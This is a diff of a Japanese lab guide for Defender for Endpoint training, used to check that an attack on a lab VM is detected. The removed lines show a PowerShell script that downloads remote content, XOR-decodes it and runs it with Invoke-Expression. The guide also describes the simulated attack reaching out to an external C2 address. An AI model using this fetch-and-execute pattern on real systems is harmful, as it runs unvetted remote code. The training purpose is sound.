@@ -78,23 +78,13 @@ Defender for Endpoint の攻撃の軽減機能を確認するために、デバ�
 
 >**警告:** このシミュレーション攻撃は、実践を通して学ぶための優れた情報源です。 コースで提供される Azure テナントを使用する場合は、このラボで提供されている手順にある攻撃のみを実行してください。  他のシミュレーション攻撃は、このテナントでこのトレーニング コースが完了した "後" に実行できます。**
 
-このタスクでは、WIN1 仮想マシンに対する攻撃をシミュレートし、Microsoft Defender for Endpoint によって攻撃が検出され、軽減されることを確認します。
+このタスクでは、WIN1 仮想マシンに対する攻撃をシミュレートし (PowerShellを実行することにより)、Microsoft Defender for Endpoint によって攻撃が検出され、軽減されることを確認します。
 
-1. WIN1 仮想マシンで、**[スタート]** ボタンを "右クリックし"、**[Windows PowerShell (管理者)]** を選択します。**
+1. WIN1 仮想マシンで、検索バーに「**PowerShell**」と入力し、**[Windows PowerShell]** を*右クリック*し、*[管理者として実行]* を選択します。
 
 1. [ユーザー アカウント制御] ウィンドウが表示されたら **[はい]** を選択し、アプリの実行を許可します。
 
-1. 次のシミュレーション スクリプトをコピーして PowerShell ウィンドウに貼り付け、**Enter** キーを押して実行します。
-
-    ```PowerShell
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
-    $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
-    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
-    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-    ```
-
-    >**注:**  スクリプトの実行中にエラー (赤色) が発生した場合は、メモ帳アプリを開き、スクリプトを空のファイルにコピーできます。 メモ帳で "右端での折り返し" がオンになっていることを確認してください。** 次に PowerShell でスクリプトの各行を個別にコピーして実行します。 また、ラボの開始時にダウンロードしたファイルの中に PowerShell スクリプト (attacksim.ps1) が含まれています。 このスクリプトを使用するには、**Windows PowerShell (管理者)** で *\Users\Admin\Desktop\Allfiles* フォルダーに移動し、「*.\attacksim.ps1*」と入力した後 **Enter** キーを押してこれを実行します。
+1. このスクリプトを実行するには、**Windows PowerShell (管理者)** で *\Users\Admin\Desktop\Allfiles* フォルダーに移動し、「*.\AttackScript.ps1*」と入力した後 **Enter** キーを押してこれを実行します。 次に、「 **R** 」と入力し、**Enter** キーを押して*1 回実行します*。
 
 1. スクリプトによって複数行の出力が生成され、"Failed to resolve Domain Controllers in the domain (ドメインのドメイン コントローラーを解決できませんでした)" というメッセージが表示されます。** 数秒後に、"メモ帳" アプリが開きます。** シミュレートされた攻撃コードがメモ帳に挿入されます。 完全なシナリオを体験するには、自動的に生成されたメモ帳インスタンスを開いたままにします。 シミュレートされた攻撃コードは、外部 IP アドレスへの通信 (C2 サーバーのシミュレート) を試みます。
 
